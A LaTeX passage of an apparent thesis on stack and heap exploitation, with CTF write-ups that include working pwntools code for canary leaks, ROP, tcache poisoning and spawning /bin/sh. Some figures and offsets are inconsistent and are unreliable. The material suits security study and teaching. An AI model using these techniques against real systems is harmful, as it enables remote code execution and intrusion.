    \section{Tooling}
    In this thesis i will use many tools such as: 
       \begin{itemize}
        \item[$\bullet$] pwndbg : pwndbg is a GDB plugin that makes debugging with GDB with a focus on features needed by low-level software developers, hardware hackers, reverse engineers, and developer exploitation.\newline
        \item[$\bullet$]pwntools: is a very powerful Python library created to make difficult things easy in exploit development.\newline
        Such as receiving program output contents, sending user input, sending bytes instead of letters, and much more.\newline
        \item[$\bullet$] ghidra or ida free: 
        ghidra is a free tool developed by the NSA used to decompile binary files.
        ida free is the free version of ida pro and is a cloud base decompiler, the free version works only for some architecture such as x8664.\newline
        both tools are used in the reverse engineering part.\newline
    \end{itemize}
    
    \chapter{Stack Buffer Overflow vulnerability}
    \section{background} %---------------------fix this text ------------------
    Buffer overflow is a critical vulnerability that emerged around the 1970s and 1980s where it was 
    realized through research which leads the attacker to uncontrolled access to critical points of memory.\newline
    As the 1990s arrived the explosion of the Internet and its client-server infrastructure led large numbers of people to use buffer overflow.\newline
    Furthermore, in this period the first books were published explaining how buffer overflow works.\newline
    In the 2000s people wanted to defend themselves from these types of attacks and invented two types of mitigations:\newline
    \begin{itemize}
        \item[$\bullet$] ASLR (Address Space Layout Randomization)
        \item[$\bullet$] stack canary 
    \end{itemize}
    We will explain this mitigation later.\newline
    Between 2000s and 2010s even with the mitigations attackers managed to avoid them and still exploit buffer overflow vulnerability with technique called:\newline
        \begin{itemize}
        \item[$\bullet$] ROP (Return Oriented Programming)
        \item[$\bullet$] RET2LIBC (Return to Libc)
    \end{itemize}
    Even though vulnerability was born so many years ago it still is one of the biggest an dangerous vulnerablity.
    \clearpage
    %-----------------fix until here--------------------
    \section{How Stack Buffer Overflow works}
    A buffer overflow occurs when the attacker can write more input than expected from the buffer, the overflow input exceeds in the memory in the location right after the buffer we are allocating, this could be very dangerous.\newline
    here's an example:
    \begin{verbatim}
    #include <iostream>
    
    int main() {
    
        char buff[30]; // buffer victim 
        printf(" insert your name: ");
        scanf("%50s",buff); 
        return 0;
    }
    \end{verbatim}
    In this example we can see a bad usage of a scanf function. In fact, this program has a char buffer with a size of 30, but the scanf function can read up to 50 chars.\newline 
    What happens if we insert more input than expected for the buffer?\newline
    State of the buffer before inserting input:\newline
    \begin{figure}[h]
    \centering
    \includegraphics[width=13cm]{chunk_wout_cacnary.png}
    \caption{Empty stack}
    \label{fig:example_empty_buffer}
    \end{figure}
       \clearpage
    In the example, we can notice that we have our buffer instantiated.\newline
    I wrote the question marks instead of 0x0000000000000000 because this memory at the beginning of the program is instantiated for the program we are executing, but this memory had previously been used in other contexts.\newline
    Now we will try to insert the following paylaod:
    \begin{verbatim}
        AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAPPBBBBBBBBCCCCCCCC
    \end{verbatim}
    i used the "A" to fill the buffer "P" for the remaining buffer before RBP, "B" for overwriting the saved base pointer,
    C for overwriting the return address.
    this will cause a buffer overflow because when we get to the assembly instruction leave and ret it will not find the instruction 0x4343434343434343 and the program will receive a segmentation fault.
    \begin{figure}[h]

        \caption{buffer overflow triggered}
        \label{fig:empty stack}
    \end{figure}
    \newpage
    
    This is how looks the stack after sending this payload:

        \includegraphics[width=1\linewidth]{stack_after_overflow.png}
        \caption{Stack after the overflow}
        \label{fig:stack w overflow}
    \end{figure}
    \clearpage
    \section{Mitigations against Stack Buffer Overflow}
    \subsection{Stack Canary}
    The stack canary is a protection that was invented in the 90s to prevent a buffer overflow from occurring.
    It consists of generating a protection value, generated at run time and therefore different for each time a program is executed, but remains for the entire execution of the program.
    The stack canary is placed before important metadata such as the saved base pointer and return address.
    Before executing the epilogue of the function, the integrity of the value of the stack canary is checked. If this has been modified or tampered with, the program will end immediately with the following exit code:
    \begin{verbatim}
    *** stack smashing detected ***: terminated
    \end{verbatim}
    Compilers like gcc by default compile with stack canary, by analyzing the decompiled file the compiler will insert the following lines of code to insert the stack canary.\newline
    \begin{verbatim}
    if (local_10 != *(long *)(in_FS_OFFSET + 0x28)) {
                    /* WARNING: Subroutine does not return */
    __stack_chk_fail();
  }
    \end{verbatim}
    
    The name derives from a small historical note. In fact, the name "stack canary" was inspired by the technique used in coal mines.\newline
    To avoid entering an area of the mine with high levels of toxic gases, they would let a canary fly ahead.\newline
    If the canary died, passage was prohibited; otherwise, they could pass.
    \clearpage
    Following is the photo of the stack extracted from GDB. As we can see, I inserted two commands:
    \begin{itemize}
      \item \hspace{1em} canary: This command shows the possible canaries of this code.
      \item \hspace{1em} stack 20: This command shows 20 stack instances.
    \end{itemize}
    As we can see, at address 0x7fffffffdf68, we have the value 0xe1509a30995e5f00, which is our stack canary.
    \begin{figure}
        \includegraphics[width=1.3\linewidth]{photo_of_the_stack_with_canary.png}
        \caption{ stack canary on gdb }
        \label{fig:  photo stack canary}
    \end{figure}
    \clearpage
    \subsection{ASLR}
    ASLR stands for Address Space Layout Randomization and is a technique they invented to protect operating systems from memory attacks.\newline
    In fact ASLR has the task of randomizing sections of memory such as heap stacks and shared libraries every time a program or operating system is launched.\newline
    ASLR with the stack canary seen previously and PIE that we will see later are mitigations mainly developed to avoid buffer overflow, in fact ASLR for example avoids us from jumping into memory locations that would be in fixed positions if it were not for this mitigation, and it avoids many attacks.\newline
    ASLR can randomize memory segments between a range of:
    \begin{verbatim} 
    2^8(256) to  2^16(65536)
    \end{verbatim}
    on the linux kernel we can check the level of randomization with the following command:
    \begin{verbatim}
    cat /proc/sys/kernel/randomize_va_space
    2
    \end{verbatim}
    the result of the command is 2 this indicate that we have maximum number of randomization in my personal linux kernel.\newline
    Follows a photo that explain how aslr works.
    \begin{figure}[h]
        \centering
        \includegraphics[width=0.8\linewidth]{aslr_explanation.png}
        \caption{ASLR}
        \label{fig:aslr }
    \end{figure}
    \clearpage
    \subsection{PIE}
    PIE stands for Position Independent Executable and is very similar to ASLR, in fact it follows the same concept as ASLR but with the binary assembly memory region.\newline
    As can be interpreted from the name Position Independent gives the possibility for a binary to be loaded and executed in memory at arbitrary addresses, this means that the program data instead of referring to addresses in fixed memory are referenced through the use of an offset random to the current position where it is loaded plus the offset.

    \section{How to exploit a buffer overflow and demonstration of a challenge}
    In this chapter I will explain the techniques used to exploit a buffer overflow and demonstrate how the techniques work with an example of an exploit.\newline
    As a demonstration I used a challenge proposed as training in preparation for the national competition.\newline
    I found and decided to present the following challenge because it includes the bypass of all mitigations and an exploitation technique that is still very effective.\newline
        The challenge is called terminator and two files are attached:

    \begin{itemize}
        \item[$\bullet$] file terminator ELF  
        \item[$\bullet$] libc with which they compiled that binary
    \end{itemize}
    \clearpage
    
    \subsection{Plan and organization of steps to carry out a challenge}
    When it comes to finding bugs in real-world applications or solving cybersecurity challenges, I like to divide the work into four main points: \newline
    \begin{itemize}
        \item[Step 1:] understand the environment.
        \item[Step 2:] reverse engineering.
        \item[Step 3:] understand which mitigations are.
        \item[Step 4:] write the exploit and test it.
    \end{itemize}

    \subsection{Understand the envirnoment}
    launching the command "file terminator"  we have the first information such as:\newline
    \begin{itemize}
        \item[$\bullet$] terminator is obviously a 64 bit x86-64 elf file.
        \item[$\bullet$] the binary is not stripped, this is positive because it implies that we will have debug symbols and in the reverse engineering phase it helps us a lot .
    \end{itemize}
    \subsection{Reverse Engineering}
    this is one of the most important and complicated phases, in fact from a binary file using tools such as IDA or Ghidra which interpret binary files and decompile them to make this phase easier.\newline
    Certainly, even with very powerful tools like these, the decompiled code will never be as clean as the original code.\newline
    In fact this phase involves an interpretation of the code through the decompiled code and the assembly that is shown.
    I decide to show a challenge with a very simple.
    I decided to show a challenge that has a simple reverse engineering part because the topic of the thesis is the exploitation phase.
    In fact we come across the following function which contains two critical bugs:\newline
    \clearpage
    \begin{figure}[h]
        \includegraphics[width=1.3\linewidth]{terminator_rev.png}
        \caption{victim function on ghidra}
        \label{fig:rev_terminator}
    \end{figure}
    As we can see the decompiled version does not interpret the names of the variables and the types, in this specific case the reverse engineering part is simple but can usually take several hours, after a small adaptation the code we interpreted is the following:\newline
    \begin{figure}
        \centering
        \includegraphics[width=1\linewidth]{terminator_rev2.png}
        \caption{victim function adapted}
        \label{fig:enter-label}
    \end{figure}

    \clearpage
        From this code we can interpret two critical bugs and one mitigation.\newline
    Initially a char buffer of size fifty six is instantiated, some prints are made and then we encounter the first bug.\newline
    The read function, as we can read from the manual, reads the number of bytes indicated within the function, in this specific case fifty six and does not add the null byte by default, in fact the programmer added it manually in the position that reflects the bytes read , however causing an off by one because it will put the null byte in the next byte at the end of the buffer, overwriting the first least significant byte of the next address.\newline
    vulnerable code:\newline
    \begin{verbatim} 
        char buffer [56];
        size = read(0,buffer,56);  
        buffer[(int)size] = '\n';
    \end{verbatim}
    The second critical bug is a buffer overflow where the provenance is requested, in fact it uses the same name buffer to save the provenance.
    Since the buffer is fifty-six characters long and the read has the number of bytes it will read set to seventy-two characters, this undoubtedly causes a buffer overflow of as many as fourteen characters.
    vulnerable code:\newline
    \begin{verbatim} 
    char buffer [56];
    read(0,buffer,72);
    \end{verbatim}
    Finally, from this function we can understand something that we would have analyzed later but realizing it previously already makes us aware of a potential problem.\newline
    In fact, from the decompiled code we find the code used by the compiler to insert the canary stack, which will prevent us from doing buffer overflows without first leaking the canary stack.\newline
    vulnerable code:
    \begin{verbatim} 
    if (local_10 != *(long *)(in_FS_OFFSET + 0x28)) {
                        /* WARNING: Subroutine does not return */
        __stack_chk_fail();
    }
    \end{verbatim}
    
    \clearpage
    \subsection{Understand which mitigations are active}
To understand the mitigations the pwntools library help us, in fact there is a feature that allows us to check the mitigations only with the following command:
    \begin{verbatim}
        checksec terminator                                     
[*] '/home/ferro/Downloads/terminator'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
    \end{verbatim}
    And the checksec command shows that we have a amd64-64-little that stand for x86-64 infrastructure, we have also Full RELRO that means we cant overwrite any plt and got section infact that memory is mapped as read only section, is not important for this specific exploit but in other exploitation techniques can be a big obstacle to bypass.\newline
    Than we have stack canary, we have already saw the canary code in the reverse engineering step, that confirm the presence of the canary, this will make our life difficult in the exploitation part.\newline
    Furthermore we have NX enabled so we cant execute shellcode directly in the stack.\newline
    And finally a good news we haven't PIE so the program data wont be randomize.\newline
    \subsection{Write the exploit and test it}
    \subsubsection{Leak canary and Base Pointer}
    The first step I did in the exploit is find the stack canary and save the base pointer because would be very useful later.
    The first overflow is perfect for our work, in fact if we look in the decompiled code we can see how the name input produces a bug, an off by one and allows us to overwrite the first byte of the canary stack, a feature of the canary stack is that the first three nibbles and therefore the first and a half bytes are always zero.\newline
    In fact the printf always prints up to the string terminator or null byte, this is the reason why the stack canary being after the name buffer will not be printed because the first byte is always a null byte.\newline
    But what happens if we overwrite the first byte of the canary with off by one?  
    \newpage
    exploit code to leak the canary:
    \begin{verbatim} 
    io.sendafter(b">", b"A"*56) # sending after char ">" 56*A 
    io.recvuntil(b'Hello '+ b'A'*56) #recive the output until HelloAAAA....A
    canary=io.recv(8) # save the canary  
    svb=io.recvuntil(b'Nice' , drop=True) 
    canary=b"\x00"+canary[1:8] # fixing the byte we overwrite to leak the canary
    real_canary=u64(canary[0:8]) #conver the canary to unsigned 64 bit 
    real_svb=u64(svb.ljust(8,b'\x00')) #convert the save base poiter to unsigned 64 bit
    log.info(f"leaked canary: {hex(real_canary)}") #stampo il canary
    log.info(f"leaked save base pointer: {hex(real_svb)}") #stampo il svp
    \end{verbatim}
    sendafter recvuntil are all pwntools functions that allow in the case of sendafter to send input bytes (in this case fifty-six A),
    recvuntil instead allows you to receive the program output.\newline
    \begin{figure}[h]
        \centering
        \includegraphics[width=1.3\linewidth]{leaked_canary_terminator.png}
        \caption{Enter Caption}
        \label{fig:leaked the canary in this function}
    \end{figure}
    
    As we can deduce from the image in the left shell after our A the stack canary and the save base pointer are printed, and you can see that the off by one was successful in fact the last byte of the canary instead of being \textbackslash x00 is \textbackslash x0a indicating \textbackslash n. \newline
    \clearpage
    Following is an image that explains the state of the stack after the off by one.\newline
    \begin{figure}[h]
        \centering
        \includegraphics[width=1\linewidth]{draw_terminator_stack_canaryleak.png}
        \caption{stack status after off by one}
        \label{fig:stack terminator}
    \end{figure}
    As you can see the initial canary address 0x52eb83d416216c000
    was overwritten in the last byte and became 0x52eb83d416216c0a.
    The printf not encountering null bytes either in the contents of the stack canary or in the contents of the save base pointer will print both.\newline
    \subsubsection{Stack Pivoting and ASLR bypass}
    Now that we have the stack canary and the base pointer leak, we can move on to the part of the exploit that allows us to execute commands remotely.\newline
    Having NX as a mitigation we cannot write and execute shellcode on the stack so we will write a ROP chain.
    A ROP chain consists of searching inside our binary for assembly instructions which, when chained together, allow us to make syscalls that interest us.\newline
    \clearpage
    We have a tool that helps us search for gadgets called ropper.\newline
    \begin{verbatim}
    shell command used to find gadgets.
    ~/home/ferro/Downloads/terminator ropper --file=terminator
    \end{verbatim}
    This command will give us more than a hundred instructions as output, following is a photo of the section of the most interesting ones.\newline
    \begin{figure}[h]
        \centering
        \includegraphics[width=1.2\linewidth]{rop_gadget.png}
        \caption{ropper result}
        \label{fig:ropper}
    \end{figure}
    
    At this point we can actually try to pop a shell with a rop chain and do remote command execution, but we would encounter two main problems.\newline
    \begin{itemize}
        \item[Problem 1:] We don't have enough space after the overflow to perform a rop chain.
        \item[Problem 2:] We don't have the base of the libc to bypass aslr.
    \end{itemize}
    So there are two solution: \newline
    \begin{itemize}
        \item[Solution 1:] Perform a stack pivoting attack.
        \item[Solution 2:] Leak  the libc address.
    \end{itemize}
    \clearpage
    \paragraph{Stack Pivoting}

    When we don't have enough space for the rop chain we can perform an attack called stack pivoting, it consist in manipulating the stack to enlarge the stack that we have available. \newline
    Basically we fake the rsp register to  enlarge the stack, there are many ways to perform a stack pivoting, we will find out my version later.\newline
    \paragraph{Leak the Libc base}
    To leak the base address of libc we will perform a puts of an got fuction address and after the leak, we will calculate the base of the libc doing :\newline
    \begin{verbatim}
        base Libc = address function with ASLR - fuction address with out ASLR  
    \end{verbatim}
    Follow the exploit code.\newline.
    \begin{verbatim}
                
        pop_rdi=0x4012fb
        puts1=0x84420      
        payload2=flat(
             p64(pop_rdi),#address of pop rdi
             p64(exe.got.puts),#address of got puts fucnion
             p64(exe.sym.puts),#address that will actualy print the got puts addres
             p64(0x00401292), #ret 
             p64(exe.sym.main),#calling main again
             b'A'*16,#fill the remaining space of the buffer
             p64(real_canary), #send the canary to bypass the canary mitigation
             p64(target_bp), #send the target base pointe    
        )
        io.sendafter(b">", payload2)
    \end{verbatim}
        
    Here is the exploit as we can see at the beginning I saved the addresses of pop rdi which is very useful because it allows us to populate the contents of the syscall, then the address of puts without base and then calculate it later.\newline
    Subsequently I will write the rop that will allow me to do stack pivoting and leak the puts address to calculate the base of the libc.\newline

    \chapter{Heap Overflow Vulnerability}
    \section{Background}
        This attack was first documented in 2005 in a paper called malloc maleficarum, where 5 techniques that are still usable today called: 
       \begin{itemize}
        \item[$\bullet$] house of force
        \item[$\bullet$] house of spirit
        \item[$\bullet$] house of prime  
        \item[$\bullet$] house of lore 
        \item[$\bullet$] house of mind
    \end{itemize}

    have been explained, in this chapter we will talk about the most famous, house of force which includes a bug called heap overflow.
    \clearpage
    
    \section{Malloc internal}
    The next bug that I will show, as can be understood from the name, concerns another section of memory such as the heap that works differently than the stack.\newline
    The heap known as Dynamic memory is a memory that is used for dynamic allocation, this is useful because you don't need to care about the size and the life time of the object. \newline
    Furthermore the heap in languages as C is manipulated from the user through functions as malloc() calloc() that permit you to create heap memory section usually called chunk, and free() to free your memory.\newline
     \begin{verbatim}
         void *a = malloc(8);

    Immagine to have this line of code, what is happening in the heap memory?\newline
    The heap will create this chunk where the first quad-word is 0x20 that represent the size of the chunk, 0x20 is the minimum size for a chunk, and the pointer to the chunk will be the next quad word "0x4ce770".\newline

    So we can deduce that the heap saves data such as the size inline directly on the heap, like the stack does for base pointers, etc.\newline
    The last nibble of the size field is 0x1, is used to represent flags, in this case the least significant bit is set indicating prev\_insue.\newline
    The prev\_inuse flags indicate, if the previous contiguous chunk is used will be set to 1 otherwise 0. \newline
    Last thing i want to talk about malloc internal is the top chunk.\newline
    Malloc treats that as yet unused heap memory as a single large chunk called top chunk.\newline
    In Fact every time we request memory from a malloc or calloc function we are stealing a part of the top chunk.\newline
    The value indicated in gdb previously is the remaining space of the heap memory.\newline
    In many glibc version the top chunk value hasn't any type of integrity check, this will be the point of the heap overflow.\newline
    \clearpage
    
    \section{How it works a Heap Overflow}
    As explained previously, malloc(), calloc() and realloc() are libc functions that allow you to create portions of dynamic memory called chunks into which data can be inserted dynamically.
    But if these features are used incorrectly, there is a possibility that an attacker will exploit these mistakes to create critical attacks.
    \begin{verbatim}
        void *malloc(size_t size);
        void *calloc(size_t nmemb, size_t size);
        void *realloc(void *ptr, size_t size);
    \end{verbatim}
    These are the definitions of malloc calloc and realloc from the linux manual, as you can see all the functions require a size, which is often the cause of many heap overflows.
    The following is vulnerable code that shows a misuse of size within these functions:
    \begin{verbatim}
        #include <stdio.h>
        #include <stdlib.h>
        void setup() {
          setbuf(stdin, NULL);
          setbuf(stderr, NULL);
          setbuf(stdout, NULL);
        }
        
        int main(){
            setup();
            puts("Insert your name: ");
        
            char *buf = malloc(100);
            if (buf == NULL) {
                fprintf(stderr, "Error malloc failed, NO INPUT");
                return 1;
            }
            scanf("%s", buf);
            printf("hello %s\n", buf);
        
            free(buf);
            return 0;
        }
    \end{verbatim}
    This code contains a critical bug, as can be seen when user input is entered, scanf is not used correctly, in fact the correct use is to specify \%n-1s in the format string where n is the size of the buffer and minus one is used because scanf add a null byte as a terminator.
    \clearpage
    Consequently if the user enters more than 96 characters there will be a heap overflow.\newline
    Potential payload and heap analysis:
    \begin{verbatim}
        AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
        AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
    \end{verbatim}
        \begin{figure}[htbp]
        \centering
        \includegraphics[width=1\linewidth]{heap_overflow.png}
        \caption{Heap overflow viewed in gdb }
        \label{fig:enter-label}
    \end{figure}
    How can we analyze the chunk that we have allocated "buf" is allocated previously compared to the value of the top chunk, so by performing an overflow we will overwrite the value of the top chunk with the value 0x4141414141414141
    the heap will think that the size of the remaining heap will be an arbitrary number.\newline
    At this point the program will not crash because at the time I am writing this thesis no type of integrity check on the size of the top chunk has been implemented, this allows us to create arbitrary write.
    \clearpage
    \paragraph{Craft arbitrary write}
    Basically in the world of exploitation we always try to have arbitrary writes and arbitrary reads.\newline
    Arbitrary read permit us to read addresses that allow us to bypass mitigations such asth aslr, canary. \newline
    Arbitrary writes to overwrite addresses that lead us to have remote command execution.
    In the case of the example shown above we have no print source so crafting an arbitrary read is impossible but in larger and more complicated systems they can be found. \newline
    But we have an arbitrary writing source, in fact we can overwrite the size of the top chunk making it giant and managing to overwrite the libraries and stack sections so as to overwrite sensitive data.
    \begin{figure}[htbp]

        \includegraphics[width=1\linewidth]{heap_trasformation.jpg}
        \caption{heap after overwriting top chunk}
        \label{fig:enter-label}
    \end{figure}
    \section{Mitigation}
    unfortunately the house of force technique, even if I decided to explain it previously, is deprecated since the glibc version 2.27, at the time of writing this thesis we are at 2.35 and many mitigations have been added that prevent the use of the house of force technique.\newline
    Inside the heap, many mitigations have been added within the glibc to avoid launching attacks, in this section we will only analyze those related to house of force and in the next section bypass techniques will be explained.\newline
    As explained previously, house of force consists of overwriting the top chunk so as to make it huge, exceeding the heap memory and being able to read/overwrite the entry that will allow us to do RCE.\newline
    \subsection{Top Chunk integrity check}
    Overwriting the top chunk with a size larger than that established by the creation of the heap is impossible, in fact this portion of code has been added within the code:\newline
    \begin{verbatim}
        victim = av->top;
        size = chunksize (victim);
    
        if (__glibc_unlikely (size > av->system_mem))
            malloc_printerr ("malloc(): corrupted top size");
  
    \end{verbatim}
    This code, as you can imagine, even if the rest of the code is absent, carries out a check on the size of the chunk, in fact if we try to create a chunk that overwrites the top and subsequently create another allocation on the heap will be print the string, "malloc( ): corrupted top size".
    \subsection{Safe Linking}
    The fundamental idea of safe linking is to mask the addresses within the linked lists that manage fastbin and tcache bins.\newline
    The technique that exploits safe linking uses ASLR mitigation which I explained in the stack buffer overflow mitigations chapter.\newline
    The forward pointer inside the fastbin and tcache bins from glibc version 2.32 will be XOR'd with the bits randomized by aslr.
    This mitigation does not allow attackers to have a clean pointer to the list of freed chunks.
    A hypothetical situation could be: \newline
    p : represents the value of the pointer that is saved by the fd field.\newline
    l : represents the address space where the fd is stored.\newline
    l >> 12:  shifted right by 12 is used to XOR P resulting in an encoded pointer, P'.\newline
    Below is an example written in Python that explains how safe linking masking and unmasking works: \newline
    \clearpage
    \begin{verbatim}

    p = 0x0000BA9876543180
    l = 0x0000BA9876543180
    x = x = p ^ (l>>12) # 
    print("masked ptr: ", hex(x))
    lbitshifted = l >> 12 
    y = x ^ lbitshifted
    print("unmasked ptr: ", hex(y))
    \end{verbatim}
    
        
    \section{How to exploit a heap overflow and demonstration of a challenge}
    \subsection{Introduction}
    In this section we will analyze a challenge that I solved during the csaw qualifier competition, a competition organized by an American team where the top 8 teams went to New York to play the finals.\newline
    In the challenge we will analyze there is a heap overflow bug, the name of the challenge is notes. \newline
    \subsection{Understand The Environment}
    In the challenge comes attachment that contains an x86\_64 ELF binary and the libc.so.6 file, no source code is provided that means we have to decompile the ELF file and analyze it with ida or ghidra.\newline
    The first step is to try to extrapolate what glibc is about so as to understand what mitigations and heap structure we are facing, following the commands with which I understood it:
    \begin{verbatim}
        command:
        strings libc.so.6 | grep GLIBC | less
        output:
        GNU C Library (Ubuntu GLIBC 2.35-3ubuntu1.6) stable release version 2.35.
    \end{verbatim}
    As you can see, we are talking about a glibc version 2.35, this implies that we will not be able to use the classic house of force technique because the safe linking and top chunk integrity check mitigations will be active.\newline
    The second step is to understand the mitigations applied by the kernel as in the case of stack buffer overflow we will use the checksec command of pwntools   .\newline
    \begin{verbatim}
        command:
        checksec chall
        outout:
        [*] '/home/ferro/Documents/tesi/thesis/chall_heap/chall'
        Arch:     amd64-64-little
        RELRO:    Full RELRO
        Stack:    Canary found
        NX:       NX enabled
        PIE:      PIE enabled
    \end{verbatim}
    As you can see all the mitigations are enabled, but in the heap case we have to care only about PIE, ASLR, and FULL RELRO we wont deal with stack canary.
    \subsection{Reverse Engineering}
    The logic of the binary is very simple, it allows you to add, modify, view, remove notes, it is managed via an array of stuct that keeps track of the size of the note and a pointer to the chunk that will be allocated.\newline
     Analyzing the binary better, the function that allows you to edit a note contains a critical bug, follows the image of the editNote function.\newline
     \begin{figure}[htbp]
         \centering
         \includegraphics[width=1\linewidth]{heap_chall_bug.png}
         \caption{Vulnerable function}
         \label{fig:enter-label}
     \end{figure}

    As you can see when the input to be inserted is requested to modify the previously allocated note, the read function is used in a vulnerable way, after having applied some techniques and details in the field of reverse engineering, we can interpret the call to read like this:
    \begin{verbatim}
    read(0,note[edit_index]->text,note[edit_index]->size+16);
    \end{verbatim}
    Obviously, since we cannot change the size inside the memory we have the possibility of reading sixteen more characters inside the heap, allowing the attacker to perform a heap overflow.\newline
    The other functions such as createNote, deleteNote and viewNote seem to be implemented correctly without bugs, for this reason I decided not to show them.
    \subsection{Exploit Development and Testing}
    In this section we will talk about how to exploit a buffer overflow with chunk creation, edit chunk, view chunk, delete chunk primitives.\newline
    The first thing I did is create the exploit.py file and import pwntools, a library that allows me to send and receive bytes from the program, the code follows.
    \begin{verbatim}
    def malloc(size,index):
        io.sendline(b"1")
        io.sendlineafter(b"index:",str(index).encode())
        io.sendlineafter(b"size:",str(size).encode())
    def edit(index,content):
        io.sendline(b"2")
        io.sendlineafter(b"Index:",str(index).encode())
        io.sendafter(b"content:",content)
    def view(index):
        io.sendline(b"3")
        io.sendlineafter(b"Index:",str(index).encode())
    def delete(index):
        io.sendline(b"4")
        io.sendlineafter(b"Index:",str(index).encode())
    \end{verbatim}
    In the code above we can see two functions implemented by the pwntools library, both will send the input as bytes but sendlineafter allows you to do this after a string that the output generates.\newline
    \paragraph{leak libc base}
    the first step is to leak the libc base \newline
    There is a trick that allows you to leak the libc, which consists in allocating a chunk of very large size that is not freed in the tcache, in fact if we perform a free of a chunk that does not end up in the tcache (size greater than 0x408) we will have the fd field of our chunk pointing to libc.\newline
    If we are going to free an unsortedbin this will point to a pointer of the main arena, which will contain a pointer to libc.\newline
    The main arena is a structure that has the task of managing the heap, saving values such as top chunk, last reminder, heap start and heap and many other fields.\newline
    \clearpage
    Below is the code that allows us to leak libc base and bypass safe linking.\newline

    \begin{verbatim}     
    malloc(0x500,0)
    malloc(0x60,1)
    delete(0)
    pause()
    malloc(0x500,0)
    view(0)
    io.recvuntil("note : ")
    libc_addr=u64(io.recvline(False).ljust(8,b"\x00"))
    libc_addr=libc_addr-0x21ace0
    libc.address=libc_addr
    \end{verbatim}
    \begin{figure}[htbp]
        \centering
        \includegraphics[width=1\linewidth]{leak_libc_heap_chall.png}
        \caption{Leak libc}
        \label{fig:enter-label}
    \end{figure}
    As you can see at address 0x55671813e2c0 we have a pointer to libc, at this point we just need to reallocate chunk of the same size and view it, malloc will not clean the contents of the freed chunk allowing us to leak a pointer to libc. \newline
    \paragraph{leak heap base and safe linking bypass}
    As regards heap leak, the same technique used previously is used but with the difference that the victim chunk will be of a size that allows us to insert it into the tcache after it is freed.\newline
    In fact, the tcache creates a FIFO list of freed chunks for each chunk size which will be incremented by 0x10.\newline
    the code follows:
    \begin{verbatim}
    #lek heap and safe linking
    malloc(0x90,2)
    delete(2)
    malloc(0x90,2)
    view(2)
    io.recvuntil("note : ")
    key=u64(io.recvline(False).ljust(8,b"\x00"))
    heap_base = key<<12
    success(f"SAFE LINKING KEY LEAK@: {hex(key)} ")
    success(f"HEAP BASE LEAK@: {hex(heap_base)} ")
    delete(1)
    delete(2)
    \end{verbatim}
    As you can see, we allocate a chunk of size 0x90 and make this free, after we reallocate it we will have a heap leak.\newline
    As regards the safe link bypass, the leak that we will generate will be the key that we will need to bypass the mitigation, in fact by performing an xor operation between the key and the pointer on the heap any address on the heap will bypass safe linking.\newline
    Finally, by shifting the key to the right we will have the base of the heap.
    \begin{figure}[htbp]
        \centering
        \includegraphics[width=1\linewidth]{leak_heap_heap_chall.png}
        \caption{heap leak}
        \label{fig:enter-label}
    \end{figure}
    \paragraph{craft arbitrary read and leak environ with tcache poisoning attack}
    At this point we have all the leaks, in most heap exploits you need to craft arbitrary read and write, with these two techniques it is possible to perform many attacks.\newline
    First we will create an arbitrary read to leak the environ.\newline
    Environ is a pointer that usually points to the stack and is useful because it will always be at the same offset away from the return addres.\newline
    So the plan is to leak environ so as to understand how far away we are from the return address and then overwrite the return address with a rop and do remote command execution.\newline
    The technique we will use to leak environ is very reminiscent of the one to leak base heap.\newline
    In fact we can allocate two chunks with a size that will allow us to place them in tcache once they are freed and contiguous,  having 16 bytes of overflow we will be able to overwrite the size of the next previously freed one and overwrite the fd field with the environ address.\newline
    Then reallocate the chunk and inspect it, thus effectively leaking the environ.\newline
    Below is the code that allowed me to leak environ:\newline
    \begin{verbatim}
        malloc(0x78,3) # 3
        malloc(0x78,4) # 4 
        malloc(0x78,5) # 4 
        delete(5)
        delete(4) # 4
        edit(3,b"A"*0x78+p64(0x81)+p64(libc.sym.environ^key))
        malloc(0x78,4)  
        malloc(0x78,5) 
        view(5)
        io.recvuntil(b"note : ")
        environ=u64(io.recvline(False).ljust(8,b"\x00"))
        success(f"ENVIRON LEAK@: {hex(environ)} ")
    \end{verbatim}
    The image above explains the attack we just saw.\newline
    Furthermore, you will notice within the code that I have made that there are more allocations than those that I explained in the theoretical attack, in fact a critical point of heap exploitation is consolidation, glibc has optimization and memory saving techniques that if larger chunks than those previously used are allocated, the smaller ones will be consolidated.
    In this case we founded that environ it's faraway 0x120 bytes from main return address.\newline
    \begin{figure}
        \centering
        \includegraphics[width=1\linewidth]{arb_read_heapchall.png}
        \caption{Enter Caption}
        \label{fig:enter-label}
    \end{figure}
    
    \paragraph{craft arbitrary write and rewrite return address with tcache poisoning attack}
    At this point all we have to do is overwrite environ + 0x120, therefore the return address.\newline
    Arbitrary write works in the exact same way as arbitrary read but with the difference that instead of inspecting the function to leak any pointers, we have to write, so instead of the viewNote function we will use Editnote.\newline
    So as before we will create two chunks with size which will allow us to stay inside tcache, free the second to exploit the first so as to overwrite the size field with a fake size and the fd field with environ + 120 which corresponds to the return address.\newline
    \clearpage
    Follows the code that i used:\newline
    \begin{verbatim}
        malloc(0x18,1)
        malloc(0x18,2)
        malloc(0x18,3)
        delete(1)
        delete(2)
        delete(3)
        malloc(0x108,3) # 3
        malloc(0x108,4) # 4 
        malloc(0x108,5) # 4 
        delete(5)
        delete(4) # 4
        edit(3,b"B"*0x108+p64(0x111)+p64((environ-0x128)^key))
        malloc(0x108,4)  
        malloc(0x108,5)
    \end{verbatim}
    From this portion of code you can see how in addition to having created arbitrary write we are bypassing safe linking by xoring the environ address with the key leaked at the beginning of the exploit.\newline
    \begin{figure}[htbp]
        \centering
        \includegraphics[width=0.5\linewidth]{arb_write_heapchall.png}
        \caption{Arbitrary write}
        \label{fig:enter-label}
    \end{figure}
    \clearpage
    \paragraph{rop attack and remote command execution}
    Finally we need to write the rop that will allow us to spawn a /bin/sh shell so as to execute commands remotely.\newline
    As explained in the stack buffer overflow chapter, rop is an attack that allows us to execute instructions and jump to another instruction via ret.\newline
    The rop structure of the rop that we will execute will look like this:
    \begin{verbatim}
        pop rdi; ret;
        address of "/bin/sh\x00"
        system 
    \end{verbatim}
    In this way the return address will insert the address of "/bin/sh" into the rdi register and ret will point to the system call inside the libc.\newline
    So we will make a call to system("/bin/sh").\newline
